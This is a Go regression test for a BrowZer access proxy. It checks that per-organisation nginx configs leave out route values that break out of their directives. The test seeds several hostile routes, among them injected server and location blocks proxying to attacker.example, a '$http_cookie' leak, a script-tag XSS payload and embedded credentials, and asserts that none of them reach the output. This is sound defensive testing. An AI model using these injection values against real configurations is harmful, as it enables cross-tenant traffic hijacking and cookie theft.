package access

import (
	"context"
	"strings"
	"testing"

	"go.uber.org/zap"
)

// ROUTE VALUES CANNOT REWRITE THE BROWZER CONFIGURATION.
//
// The nginx configuration generated for the BrowZer public vhosts, the hop and
// the shared router is one file each for every organization, and it was built
// by formatting route values into it with fmt: the route's host into
// server_name, its landing path into a return, its upstream into proxy_pass,
// its path into location blocks and into the router's landing page. The route
// API checks none of them, and where from_url did not parse, its raw text
// stood in for the host. One organization's administrator could end a
// directive and write their own: a server block for another organization's
// host, a location proxying elsewhere, or a file nginx refuses to load.
//
// Routes are seeded as the route API stores them, in two organizations, and
// every generator that reads queryBrowZerRoutes is run against a migrated
// database: the hostile routes are left out, the plain ones are written.
func TestTheBrowZerConfigurationCarriesOnlyRouteValuesItCanWriteSafely(t *testing.T) {
	f := newAdminGateFixture(t)
	ctx := context.Background()
	tm := NewBrowZerTargetManager(f.db, zap.NewNop(), "")
	tm.SetDomain("browzer-" + f.suffix + ".example.test")

	seed := func(org, name, fromURL, toURL, landing, mode string) {
		t.Helper()
		if _, err := f.db.Pool.Exec(f.ctx, `
			INSERT INTO proxy_routes (org_id, name, from_url, to_url, require_auth, enabled,
			                          ziti_enabled, browzer_enabled, ziti_service_name, landing_path, hosting_mode)
			VALUES ($1::uuid, $2, $3, $4, true, true, true, true, $5, $6, $7)`,
			org, name+"-"+f.suffix, fromURL, toURL, name+"-"+f.suffix+"-zt", landing, mode); err != nil {
			t.Fatalf("seed BrowZer route %s: %v", name, err)
		}
	}
	host := func(name string) string { return name + "-" + f.suffix + ".example.test" }

	// The first organization's ordinary applications, one of them stored with
	// no landing path at all.
	seed(f.orgA, "psm", "https://"+host("psm"), "https://psm-backend.example.test/psm", "/psm/", "hop")
	seed(f.orgA, "wiki", "https://"+host("wiki"), "http://10.0.0.7:8080", "/", "direct")
	seed(f.orgA, "docs", "https://"+host("docs"), "HTTP://[fd00::7]:8081/docs/", "", "direct")

	// The second organization's administrator writes routes whose values end
	// the directive they land in.
	hostile := []struct{ name, fromURL, toURL, landing, mode string }{
		{"vhost", "https://" + host("x") + "\n}\nserver {\n listen 443 ssl;\n server_name " + host("psm") +
			";\n location / { proxy_pass http://attacker.example; }\n}\nserver { server_name " + host("y"),
			"http://10.0.0.8:80", "/", "direct"},
		{"semicolon", "https://" + host("semi") + ";ssl_certificate", "http://10.0.0.8:80", "/", "direct"},
		{"landing", "https://" + host("land"), "https://10.0.0.9/app",
			"/ui/; } location /steal { proxy_pass http://attacker.example; } #", "hop"},
		{"upstream", "https://" + host("up"), "https://10.0.0.9/app; } location /steal { proxy_pass http://attacker.example; } #",
			"/", "hop"},
		{"variable", "https://" + host("var"), "http://10.0.0.8:80", "/$http_cookie", "hop"},
		{"markup", "https://browzer-" + f.suffix + `.example.test/x"><script>alert(document.domain)</script>`,
			"http://10.0.0.8:80", "/", "direct"},
		{"credentials", "https://" + host("cred"), "http://user:pass@10.0.0.8:80", "/", "direct"},
	}
	for _, h := range hostile {
		seed(f.orgB, h.name, h.fromURL, h.toURL, h.landing, h.mode)
	}

	routes, err := tm.queryBrowZerRoutes(ctx)
	if err != nil {
		t.Fatalf("query BrowZer routes: %v", err)
	}
	var names []string
	for _, r := range routes {
		names = append(names, r.hostname)
	}
	all := strings.Join(names, " ")
	if len(routes) != 3 || !strings.Contains(all, host("psm")) || !strings.Contains(all, host("wiki")) || !strings.Contains(all, host("docs")) {
		t.Fatalf("queryBrowZerRoutes returned %q, want the three plain routes and none of the hostile ones", names)
	}

	vhost, err := tm.GenerateBrowZerVHostConfig(ctx)
	if err != nil {
		t.Fatal(err)
	}
	hop, err := tm.GenerateBrowZerHopConfig(ctx)
	if err != nil {
		t.Fatal(err)
	}
	router, err := tm.GenerateBrowZerRouterConfig(ctx)
	if err != nil {
		t.Fatal(err)
	}
	for name, cfg := range map[string]string{"vhost": string(vhost), "hop": string(hop), "router": string(router)} {
		for _, planted := range []string{"attacker", "/steal", "$http_cookie", "<script", "ssl_certificate;", "user:pass"} {
			if strings.Contains(cfg, planted) {
				t.Errorf("the %s configuration carries %q from a hostile route:\n%s", name, planted, cfg)
			}
		}
		if strings.Count(cfg, "{") != strings.Count(cfg, "}") {
			t.Errorf("the %s configuration's braces do not balance:\n%s", name, cfg)
		}
	}
	if n := strings.Count(string(vhost), "server_name "+host("psm")+";"); n != 1 {
		t.Errorf("the vhost configuration names %s %d times, want once:\n%s", host("psm"), n, vhost)
	}
	if !strings.Contains(string(vhost), "server_name "+host("wiki")+";") {
		t.Errorf("the vhost configuration lost the plain direct route:\n%s", vhost)
	}
	if !strings.Contains(string(hop), "location = / { return 302 /psm/; }") ||
		!strings.Contains(string(hop), "proxy_pass https://psm-backend.example.test/psm;") {
		t.Errorf("the hop configuration lost the plain hop route:\n%s", hop)
	}
}
